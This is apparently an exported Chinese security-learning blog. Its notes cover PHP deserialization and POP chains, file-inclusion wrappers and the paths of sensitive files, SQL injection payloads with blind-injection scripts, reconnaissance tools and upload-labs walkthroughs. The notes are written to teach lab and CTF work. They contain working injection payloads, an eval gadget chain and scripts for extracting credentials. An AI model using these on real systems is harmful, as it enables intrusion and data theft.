栗子（__destruct()与unserilize()） 1234567891011121314151617class fxxy&#123; var $name = &quot;fxxy&quot;; function __construct()&#123; echo &quot;this is __construct()&quot;; $this-&gt;name = &quot;fxxy&quot;; &#125; function __destruct()&#123; echo &quot;this is __destruct&quot;; &#125; &#125; //$test = new fxxy(); $value = &#x27;O:4:&quot;fxxy&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;fxxy&quot;;&#125;&#x27;; //echo($value); unserialize($value); //echo(&#x27;&lt;br&gt;&#x27;.$test-&gt;name.&#x27;&lt;br&gt;&#x27;); 输出为： 可见，在运用unserilize()函数时，系统会自动调用__destruct()函数 __sleep(): 关联函数：serialize() 作用：在调用serialize()函数时，系统会先查找该类中是否存在__sleep()函数，如果存在，则会优先调用此方法，返回预先设定好的允许被序列化的变量数组。 在上文中，以栗子2，如果我们不想让某些变量显示出来怎么办？增加__sleep()函数，并在中定义可以被序列化的变量或方法 栗子6 123456789101112131415161718192021class test&#123; var $name; var $age; var $flag; function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; //$this-&gt;flag = $flag; &#125; function __sleep()&#123; return array(&quot;name&quot;,&quot;age&quot;); &#125; &#125; $test1 = new test(&#x27;user&#x27;,20); echo(&#x27;&lt;br&gt;&#x27;); echo(serialize($test1));//echo函数处理的是字符串变量 此时输出： 可以看到输出中没有了flag字段 __wakeup() 关联函数：unserialize() 作用：当调用unserilize函数时，会先检查要反序列化的类中是否有__wakeup()方法，如果有，则优先调用此方法，通常用来执行一些反序列化之前的一些资源准备或初始化操作。 __toString() 定义在类中 用于处理当这个对象被当做字符串处理时返回的内容 栗子7 123456789101112131415161718192021class test&#123; var $name; var $age; var $flag; function __construct($name,$age)&#123; $this-&gt;name = $name; $this-&gt;age = $age; &#125; function __toString()&#123; return &quot;can&#x27;t echo this object&quot;; &#125; &#125; class test2&#123; var $testClass; &#125; $test1 = new test(&#x27;user&#x27;,20); echo($test1); 输出： __call() 当访问该类中不存在方法时，会触发此方法 __get() 当访问该类中不存在的属性时，会触发此方法 看一下call和get的实践 代码 123456789101112131415161718&lt;?php class fxxy&#123; public $a = 1; function __call($name,$argu)&#123; echo &quot;don&#x27;t have the function!&lt;br&gt;&quot;; &#125; function __get($name)&#123; echo &quot;don&#x27;t have the attr&quot;; &#125; &#125; $test = new fxxy(); $test-&gt;hello(); echo($test-&gt;b);?&gt; 小实践小题目在test.php中我们写入下面的代码： 1234567891011121314151617181920212223242526272829303132&lt;?php class test&#123; var $name; var $pwd; function __construct($name,$pwd)&#123; $this-&gt;name = $name; $this-&gt;pwd = $pwd; &#125; function getflag()&#123; if($this-&gt;name === &quot;welcome&quot; &amp;&amp; $this-&gt;pwd === &quot;password&quot;)&#123; include(&#x27;flag.php&#x27;); &#125; else&#123; echo(&quot;wrong name and passwords&quot;); &#125; &#125; &#125; $query = $_GET[&#x27;id&#x27;]; if(!empty($query))&#123; $flag = unserialize($query); $flag-&gt;getflag(); &#125; else&#123; echo(&quot;Plz input id~&quot;); &#125; $test1 = new test(&quot;welcome&quot;,&quot;password&quot;); //echo(serialize($test1)); show_source(__FILE__)?&gt; 分析：代码会对提交的id进行反序列化，当反序列化的name变量与pwd变量与代码指定的相同时，则会包含flag.php，输出flag。 方法：构造test类的序列化字符串，参数值为welcome和password，然后传入id CVE-2016-7124 版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 核心：当序列化的字符串中，对象变量的个数大于实际已定义的类中的个数时，会绕过__wakeup()函数 demo123456789101112131415161718192021222324252627&lt;?php class A&#123; var $name = &#x27;merryting&#x27; ; function __destruct()&#123; echo(&quot;good bye &quot;.$this-&gt;name); $fp = fopen(&quot;test.txt&quot;,&quot;w&quot;); fwrite($fp,$this-&gt;name); fclose($fp); &#125; function __wakeup()&#123; echo(1); $this-&gt;name = &quot;merryting&quot;; &#125; &#125; //$test = new A(&#x27;fxxy&#x27;); //echo(serialize($test)); //O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;fxxy&quot;;&#125; $name = $_GET[&#x27;name&#x27;]; echo($name); unserialize($name);?&gt; 代码分析： 在执行destroy()函数中的文件写入功能之前，会调用wakeup()函数将此对象的name设置为：merryting 也就是说，如果传入常规的序列化字符串，存入的name始终是merryting 比如我传入的是fxxy：输出和写入的都是merryting 那怎么利用？cve-2016-7124的核心就是绕过__wakeup()函数，怎么绕过，就是将传入的序列化字符串中的变量的个数设置大于实际的个数 前：O:1:”A”:1:{s:4:”name”;s:4:”fxxy”;} 后：O:1:”A”:2:{s:4:”name”;s:4:”fxxy”;} 此时，浏览器输出为： 此时可以看到，名字更换了，不是wakeup()函数中替换的数据，说明绕过了wakeup()函数。 绕过了wakeup()函数，接下来做什么？unserilize()函数在反序列化字符串时，结束时如果该类中定义了destruct()函数，则会调用此函数，此函数的作用见上文。如果此时__destruct()函数中存在可利用点，则可能造成反序列化漏洞（开发人员应该没有这么蠢，在显而易见的地方写敏感操作），那么，下面学习反序列化中比较复杂的一个东西——POP链 初识POP链 什么是pop链？ 假设现在我们找到了一个可以利用的unserilize点，但是在该类下的魔法函数中没有敏感的操作，简言之，找到了一个利用入口，但是没有找到我们可以利用的东西，此时，如果在魔法函数中，有代码片段调用了其他页面的属性（方法），在被调用的属性（方法）中存在同名的魔法函数/普通函数，且该函数中存在一些敏感操作，那我们就相当于找到一条路通到漏洞那里。 像上面这样，找到一个可利用点后，不断递推，在从被调用的属性（方法）中寻找敏感操作，最终串联起来，就像一个链条一样，通过层层查找，将入口和目的地连起来的方式，就是POP链 demo借用柠檬师傅的代码学习一下~ 1234567891011121314151617181920212223242526class lemon &#123; protected $ClassObj; function __construct() &#123; $this-&gt;ClassObj = new normal(); &#125; function __destruct() &#123; $this-&gt;ClassObj-&gt;action(); &#125;&#125;class normal &#123; function action() &#123; echo &quot;hello&quot;; &#125;&#125;class evil &#123; private $data; function action() &#123; eval($this-&gt;data); &#125;&#125;unserialize($_GET[&#x27;d&#x27;]); 分析如下： 可控点：unserilize()函数 在上面写的3个类中，当调用unserilize()函数时，只会发序列化lemon这个类，因为只有该类中有__destruct()函数，且该函数会调用normal类中的action()方法 敏感代码在哪？在evil类中的action()方法中，调用了eval()函数，可以执行php代码 思考点：如何通过反序列lemon类来调用eval类中的action方法。 思考过程：在原来的函数中destruct()函数new的是normol类，现在我们想调用的是evil类中的action()，那就把new的类换成evil，然后在后面unserilize()过程中，触发destruct()函数时，$this-&gt;ClassObj-&gt;action()指向的就是evil中的action()，实验一下 生成pop链 123456789101112class lemon&#123; protected $ClassObj; function __construct()&#123; $this-&gt;ClassObj = new evil(); &#125; &#125; class evil &#123; private $data = &quot;phpinfo()&quot;; &#125; var_dump(new lemon()); echo &#x27;&lt;br&gt;&#x27;; echo serialize(new lemon()); O:5:&quot;lemon&quot;:1:&#123;s:11:&quot;*ClassObj&quot;;O:4:&quot;evil&quot;:1:&#123;s:10:&quot;evildata&quot;;s:9:&quot;phpinfo()&quot;;&#125;&#125; 将这个值传给d，发现提示 报了一个致命错误，为什么呢？？ 因为！serialize在进行反序列化时，private、public、protected三个不同的属性，序列化出来的是有不同的，用python抓一下，此时，输出是这样的：O:5:”lemon”:1:{s:11:”\\x00*\\x00ClassObj”;O:4:”evil”:1:{s:10:”\\x00evil\\x00data”;s:10:”phpinfo();”;}} 发现private属性的classobj前面增加了\\x00*\\x00 在private属性的data前增加了\\x00\\x00 在浏览器输出的时候不会显示出来，把他urlencode一下再输出后传给d，输出了我们想要的效果： 1O%3A5%3A%22lemon%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D 这个小demo比较简单，主要涉及了两个类，实际情况中会更复杂. 总结需要明白下面几点 什么是反序列化漏洞：相关人员利用可控的unserilize()输入，经过一系列剖析，构造pop链，从而达到敏感操作目的 在使用serialize()函数和unserilize()函数时，相关魔法函数的调用顺序 CVE-2016-7124的核心 serialize()函数进行序列化时，不同属性序列化的区别 什么是pop链，如何构造pop链 referhttp://redteam.today/2017/10/01/POP链学习/ https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html https://xz.aliyun.com/t/378 https://www.kingkk.com/2018/07/php反序列化漏洞/ https://chybeta.github.io/2017/06/17/浅谈php反序列化漏洞/","categories":[],"tags":[{"name":"php, web","slug":"php-web","permalink":"http://example.com/tags/php-web/"}]},{"title":"git笔记","slug":"git笔记","date":"2019-09-14T16:00:00.000Z","updated":"2021-10-22T08:33:53.684Z","comments":true,"path":"2019/09/15/git笔记/","link":"","permalink":"http://example.com/2019/09/15/git%E7%AC%94%E8%AE%B0/","excerpt":"自查笔记","text":"自查笔记 创建分支/切换分支 1git checkout [-b] 分支名 查看当前分支 1git branch 创建云端分支 1git push -u origin loginAndUser 合并分支 1git merge 分支名 将修改文件添加到缓存区 1git add . 提交代码 1git commit -m &quot;备注内容&quot; 删除分支 1git branch -d 分支名 抓取远程仓库 12git pullgit fetch","categories":[],"tags":[]},{"title":"文件包含学习","slug":"文件包含","date":"2019-08-15T16:00:00.000Z","updated":"2021-10-22T08:29:58.187Z","comments":true,"path":"2019/08/16/文件包含/","link":"","permalink":"http://example.com/2019/08/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"相关函数 include() include(include_path) 作用：包含并指定include_path指定的文件，如果出错还会继续执行，生成一个警告","text":"相关函数 include() include(include_path) 作用：包含并指定include_path指定的文件，如果出错还会继续执行，生成一个警告 include_once() 作用：包含并运行指定文件，但是对于同一个文件只会包含一次 require() require(include_path) 包含并指定include_path指定的文件，如果出错会报错，不会再继续执行 require_once() 和require类似，但是对于同一个文件只会包含一次 注意：以上四个包含文件的函数，对于包含的文件不管是什么类型，都会被当作PHP文件来执行 require和include的区别： require：只要程序开始执行，则立即包含require指定的文件并执行，一般用来包含类文件、数据库等文件 include：只有执行的代码到include时，才会包含该指定的文件，一般用来包含html模板之类的文件 PHP伪协议文件包含https://www.php.net/manual/zh/wrappers.data.php php://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。 注：enctype=”multipart/form-data” 的时候 php://input 是无效的。 使用条件：allow_url_include = on demo test.php中（后续对协议的测试都用此php进行）: 1234567&lt;?php $file = $_GET[&#x27;file&#x27;]; include($file); ?&gt; php://filter 作用：用选定的过滤器读/写入数据流 格式 1php://filter/read=过滤器名称(即数据流的加密方式)/resource=要读取/写入的链表 例子 123456php://filter/read=convert.base64/resource=path //将path文件的内容经base64加密后输出//写入php://filter/write=convert.base64/resource=example.txt,&quot;hello world&quot;当需要多个过滤器时，以|分隔 更多参考https://www.php.net/manual/zh/wrappers.php.php phar:// 条件：PHP &gt;= 5.3.0 访问一个压缩包中的子文件 路径可以绝对路径也可以相对路径 zip:// 条件：php &gt;= 5.3.0 访问一个压缩包中的子文件 格式：zip://archive.zip#dir/file.txt data:// 条件： allow_url_open = on allow_url_include = on php &gt;= 5.2 格式：data://资源类型,[编码];内容 一些重要文件路径1234567891011121314151617181920/etc/passwd# 日志文件/var/log/apacheapache/logs/error.logapache/logs/access.log# 读配置文件找日志路径/etc/httpd/conf/httpd.conf/etc/init.d/httpd # session文件 PHPSESSID与cookie中指定的PHPSESSID相对应/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID# 这两个文件存着所有文件的路径，需要root权限/var/lib/locate.db/var/lib/mlocate/mlocate.db 绕过思路 绕过文件路径限制 ../进行拼接 绕过../过滤 编码 URL编码 二次URL编码 绕过文件名后缀指定 1234&lt;?php $file = $_GET[&#x27;file&#x27;]; include $file.&#x27;/test/test.php&#x27;;?&gt; 文件名后添加 # ，详情见dvwa-文件包含 medium关 ps：即如果在URL后加了#，后面的内容不会提交给服务器校验 绕过后缀 - 长度截断 不停的增加../.././ 1?file=../../.../../.../../../../../../../../../../。。。。。。。/shell.txt 在linux中达到4096字节，Windows中256字节时，会自动丢弃后面多余的部分 防御 过滤敏感字符 设置open_basedir，指定可以进行包含的目录路径 https://www.cnblogs.com/iamstudy/articles/include_file.html https://chybeta.github.io/2017/10/08/php文件包含漏洞/","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"SQL注入总结","slug":"sql注入总结","date":"2019-07-24T16:00:00.000Z","updated":"2021-10-22T08:33:06.570Z","comments":true,"path":"2019/07/25/sql注入总结/","link":"","permalink":"http://example.com/2019/07/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","excerpt":"….","text":"…. 回显注入 原理：web页面对后端返回的信息没做过滤，直接将数据库相关报错信息显示在页面上 一般性步骤 利用点是否存在SQL 注入（恶意输入与正常输入页面做对比） 获取数据库类型、版本 判断数据表字段数 order by 判断回显位置 union select payload以mysql为例： 判断是否存在sql注入 12http://test.com?id=1&#x27; // 报错语句http://test.com?id=1&#x27; or 1=1 -- - //成功执行 判断字段数 12http://test.com?id=1&#x27; order by 3-- -http://test.com?id=1&#x27; order by 4-- - //报错 判断回显位置 1http://test.com?id=-1&#x27; union select 1,2,3-- - 获取数据库版本 1http://test.com?id=-1&#x27; union select 1,version(),3-- - 获取数据库名 1http://test.com?id=-1&#x27; union select 1,database(),3-- - 获取数据表 1http://test.com?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3-- - 获取数据表的字段名 1http://test.com?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 -- - 获取用户名和密码 1http://test.com?id=-1&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users) -- - 布尔盲注主要函数 left(str,len)：获取参数str从最左边开始的前len个字符 ascii()：获取参数的ascii码 ord()：获取参数的ascii码 if(expr1,expr2,expr3)： expr1：判断条件 expr2：条件成立时返回的结果 expr3：条件不成立时返回的结果 substr(str,pos,len)：从第pos个字符开始，截取len个字符 脚本实例123456789101112131415161718192021222324252627282930313233343536import requestszidian = &#x27;sqwertyuioplkjhgfdsazxcvbnm789456123.0.,/][\\;&#123;$%&amp;*()&#125;&#x27;url = &quot;http://127.0.0.1/sqli/Less-6/?id=1&quot;def get_dbname(): for i in range(1,10): for j in zidian: print(j) #获取数据库名 payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j)) #获取数据表名 控制limit获取其他表 #payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j)) #获取字段名 #payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;表名&#x27; limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j)) #获取字段值 #payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select column_name from 表名 limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j)) print(payload) flag = requests.get(payload) if &quot;You are in&quot; in flag.text: res += j print(res)get_res() 时间盲注相关函数 sleep(x)：数据库沉睡x秒返回结果 benchark(expr1,expr2)：将expr2这个表达式执行expr1次 benchmark(1000,md5(1))：将1进行MD5加密1000次 脚本示例 sleep 123456789101112131415161718192021import requestsimport timedbname = &#x27;&#x27;zidian=&quot;qwertyuiopasdfghjklzxcvbnm-_&#123;&#125;&quot;for j in range(1,7): for i in zidian: # 修改此处获取数据表、字段等值 url=&quot;http://222.18.158.254:4609/?id=1 and if(asci(substr(database(),&#123;0&#125;,1))=&#x27;&#123;1&#125;&#x27;,sleep(5),1)&quot;.format(str(j),ord(i)) # t1 = time.time() a=requests.get(url) # t2 = time.time() # total_time = t2 - t1 if(a.elapsed.total_seconds()&gt;=5): print url print &quot;succeess&quot; dbname = dbname+i print dbnameprint dbname benchmark 123456789101112131415161718import requestsimport timedbname = &#x27;&#x27;zidian=&quot;qwertyuiopasdfghjklzxcvbnm-_&#123;&#125;&quot;for j in range(1,7): for i in zidian: url=&quot;http://222.18.158.254:4610/?id=1 and if(ascii(substr(database(),&#123;0&#125;,1))=&#x27;&#123;1&#125;&#x27;,benchmark(1e5,md5(1)),1)&quot;.format(str(j),i) a=requests.get(url) if(a.elapsed.total_seconds()&gt;=1.5): print url print &quot;succeess&quot; dbname = dbname+i print dbnameprint dbname 报错注入 原理：利用数据库的报错机制，人为的制造错误信息并将信息显示到系统提示的错误中 floor 模板 1select 1,count(*),concat(查询语句,floor(rand()*2))a from information_schema.tables group by a 获取数据库 1select 1,count(*),concat(database(),floor(rand()*2))a from information_schema.tables group by a 获取数据表 控制imit可获取其他表名 1select 1,count(*),concat( (select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))a from information_schema.columns group by a extractvalue()模板 1extractvalue(1, concat(0x25, (查询语句))) 获取数据库名 1select * from news where id=1 and extractvalue(1, concat(0x25, (select database() from information_schema.tables limit 0,1))) 获取数据库表 12select * from news where id=1 and extractvalue(1, concat(0x25, (select table_name from information_schema.tables where table_schema=database() limit 0,1)))控制limit得到其他表 获取数据库表的字段名 1select * from news where id=1 and extractvalue(1, concat(0x25, (select column_name from information_schema.columns where table_name=&#x27;表名&#x27; limit 0,1))) 获取字段值 1select * from news where id=1 and extractvalue(1, concat(0x25, (select 字段名 from 数据库名.表名 limit 0,1))) updatexml()模板 1updatexml(0x7e,concat(0x7e,(查询语句),0x7e),0x7e) 获得数据库 1updatexml(0x7e,concat(0x7e,(select database() from information_schema.tables limit 0,1),0x7e),0x7e) 获取数据库表 1updatexml(0x7e,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),0x7e),0x7e) 获取表的字段名 1updatexml(0x7e,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27; ),0x7e),0x7e) 获取字段值 1updatexml(0x7e,concat(0x7e,(select group_concat(id) from flag ),0x7e),0x7e) 此外还有二次注入，堆叠注入等 写shell select into outfile 前提：需知道物理路径 ,secure_file_priv = on @@basedir phpinfo() phpmyadmin：日志漏洞 general log general log file 绕过姿势 双写绕过 大小写绕过 内联注释 || &amp;&amp; 绕过and or 编码绕过 hex编码 ascii编码","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"kali下的信息收集工具学习","slug":"kali下信息收集","date":"2019-07-07T16:00:00.000Z","updated":"2021-10-22T08:33:36.344Z","comments":true,"path":"2019/07/08/kali下信息收集/","link":"","permalink":"http://example.com/2019/07/08/kali%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"-","text":"- nmapnmap是一款端口扫描神器。 列举常用的几种用法 常用指令 nmap -sP IP //查看一个主机是否在线 nmap IP //查看一个主机上开放的端口 nmap -sV -O IP //判断目标操作系统类型 nmap -sS IP //半开放syn扫描 nmap -p 1-1000 IP //扫描指定端口范围 nmap -p 80 IP //扫描特定端口 nmap -sV IP //查看目标开放端口对应的协议及版本信息 三个判断防火墙的扫描 nmap -sF IP nmap -sA IP nmap -sW IP //ACK,探测防火墙扫描 其他参数 -sT 全连接扫描，更慢，会被服务器记录日志，但不易被入侵检测系统检测到 -Pn 跳过Ping测试(防火墙)，扫描指定目标 -v 详细模式V越多就越详细 -p 80 ping指定端口 –script=script_name 使用脚本 脚本列表http://nmap.org/nsedoc/scripts/ 脚本使用实例： nmap –script=auth IP //负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令 http-php-version //获得PHP版本信息 Http-enum //枚举Web站点目录 smtp-strangeport //判断SMTP是否运行在默认端口 dns-blacklist //发现IP地址黑名单 nmap –script=vuln 192.168.137.* //扫描常见漏洞 smb-check-vulns //检测smb漏洞 samba-vuln-cve-2012-1182 //扫描Samba堆溢出漏洞 测试WAF是否存在 nmap -p 80,443 –script=http-waf-detect 192.168.0.100 nmap -p 80,443 –script=http-waf-fingerprint www.victom.com 实践扫描自己网段下的C段网络 选取一个ip进行信息收集，查看哪些端口处于开放 查看80端口是否开放 等等等 dmitryDMitry（Deepmagic Information Gathering Tool）是一个一体化的信息收集工具。它可以用来收集以下信息： 根据IP（或域名）来查询目标主机的Whois信息 在Netcraft.com的网站上挖掘主机信息 查找目标域中用的子域 查找目标域的电子邮件地址 探测目标主机上打开的端口、被屏蔽的端口和关闭的端口 参数 dmtry -h 123456789101112131415161718192021 -o //将输出保存到％host.txt或由-o文件指定的文件 -i //对主机的IP地址执行whois查找 -w //对主机的域名执行whois查找 -n //在主机上检索Netcraft.com信息 -s //执行搜索可能的子域 -e //执行搜索可能的电子邮件地址 -p //在主机上执行TCP端口扫描\\* -f //在显示输出报告过滤端口的主机上执行TCP端口扫描\\* -b //读取从扫描端口接收的banner\\* -t 0-9 //0-9扫描TCP端口时设置TTL（默认为2）*Requires the -p flagged to be passed //*标记的指令需要-p标记才能传递 实践1dmitry -p baidu.com -f -b fiercefierce是RSnake创立的快速有效地DNS暴力破解工具。fierce工具首先根据域名的IP地址，查询相关的域名服务器，然后利用字典进行攻击 查看参数 123456789101112131415161718192021222324252627282930313233343536fierce -hOptions:-connect [header.txt] 对非RFC1918地址进行HTTP连接（耗时长、流量大），默认返回服务器的响应头部。可通过文件指定HTTP请求头的Host信息，如：fierce -dns example.com -connect headers.txt-delay 指定两次查询之间的时间间隔-dns 指定查询的域名-dnsfile &lt;dnsfile.txt&gt; 用文件指定反向查询的DNS服务器列表-dnsserver 指定用来初始化SOA查询的DNS服务器。（仅用于出初始化，后续查询将使用目标的DNS服务器）-file &lt;domain.txt&gt; 将结果输出至文件-fulloutput 与-connect结合，输出服务器返回的所有信息-help 打印帮助信息-nopattern 不适用搜索模式查找主机。（此参数暂时没有用明白）-range &lt;1.1.1.1/24&gt; 对内部IP范围做IP反查(此参数尚未用明白)。必须与dnsserver参数配合，指定内部DNS服务器，如： fierce -range 111.222.333.0-255 -dnsserver ns1.example.com-search 指定其他的域，在其他的域内进行查找（此参数没有用明白），如： fierce -dns examplecompany.com -search corpcompany,blahcompany-tcptimeout 指定查询的超时时间-threads [number] 指定扫描的线程数，默认单线程-traverse [number] 指定扫描的上下IP范围，默认扫描上下5各个。-version 打印fierce版本-wide 扫描入口IP地址的C段。产生大流量、会收集到更多信息.-wordlist &lt;sub.txt&gt; 使用指定的字典进行子域名爆破 实践枚举文件内的子域名进行爆破，线程数为3，如果要输出到文件保存，则可在后面加上-file test.txt 1fierce -dns baidu.com -wordlist dns.txt -threads 3 dnsenum它可以查询网站的主机地址信息、域名服务器、mx record（函件交换记录），在域名服务器上执行axfr请求，通过谷歌脚本得到扩展域名信息（google hacking），提取自域名并查询，计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。 参数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960dnsenum -h--dnsserver &lt;server&gt; //指定一个DNS服务器查询A, NS and MX记录 --enum //等同于--threads 5 -s 15 -w -h, --help //显示帮助信息 --noreverse //跳过反向查询 --nocolor //禁止ADSIColor输出 --private //在文件domain_ips.txt的末尾显示并保存私有密码 --subfile &lt;file&gt; //将所有有效子域写入此文件 -t, --timeout &lt;value&gt; //设置tcp和udp超时值 --threads &lt;value&gt; //设置线程数 -v, --verbose //显示所有进度和所有错误消息.GOOGLE SCRAPING OPTIONS: -p, --pages &lt;value&gt; //抓取名称时要处理的google搜索页面的数量，默认为5页，必须指定-s开关。 -s, --scrap &lt;value&gt; //要从Google中删除的子域的最大数量BRUTE FORCE OPTIONS: -f, --file &lt;file&gt; //从此文件读取子域执行暴力枚举 -u, --update &lt;a|g|r|z&gt; //使用有效的子域更新,使用-f指定文件。 a (all) //使用所有结果更新。 g //仅使用Google抓取结果更新 r //仅使用反向查找结果进行更新。 z //仅使用区域转移结果进行更新 -r, --recursion //允许使用递归查询WHOIS NETRANGE OPTIONS: -d, --delay &lt;value&gt; //在whois查询之间等待的最大秒数，随机定义为3秒。 -w, --whois //对c类网络范围执行whois查询 // **警告**：这可以产生非常大的netranges，花费大量的时间来执行反向查找。REVERSE LOOKUP OPTIONS: -e, --exclude &lt;regexp&gt; //从反向查找结果中排除匹配正则表达式表达式的PTR记录，这对无效主机名有用。OUTPUT OPTIONS: -o --output &lt;file&gt; //以XML保存输出结果 实践枚举dns中的子域名进行暴力破解，并将有效子域名写入文件，线程设置为2 1dnsenum -f dns.txt cuit.edu.cn -threads 2 --subfile cuit.txt","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"upload-labs靶场WP","slug":"upload-labs","date":"2019-06-29T16:00:00.000Z","updated":"2021-10-22T08:31:25.582Z","comments":true,"path":"2019/06/30/upload-labs/","link":"","permalink":"http://example.com/2019/06/30/upload-labs/","excerpt":"靶场github：https://github.com/c0ny1/upload-labs 照着大佬的思维导图学习","text":"靶场github：https://github.com/c0ny1/upload-labs 照着大佬的思维导图学习 PASS-01 代码 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value; if (file == null || file == &quot;&quot;) &#123; alert(&quot;请选择要上传的文件!&quot;); return false; &#125; //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123; var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125;&#125; 分析： JavaScript代码进行前端检测对文件的上传后缀名进行了限制 绕过思路 抓包 pass-02代码 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;文件类型不正确，请重新上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 分析 后端php代码对文件的type进行了校验，仅允许上传image/jpeg类型 绕过 上传shell.php，抓包改type pass -03代码 1234567891011$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 分析 定义了一个文件后缀名黑名单：asp、aspx、php、jsp文件不可上传 还会对文件进行时间戳命令(随便上传一个文件后，复制文件路径即可获得文件名，可绕过) 绕过 利用apache解析漏洞，将后缀名改为php3 PASS-04 代码 1234567891011$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = 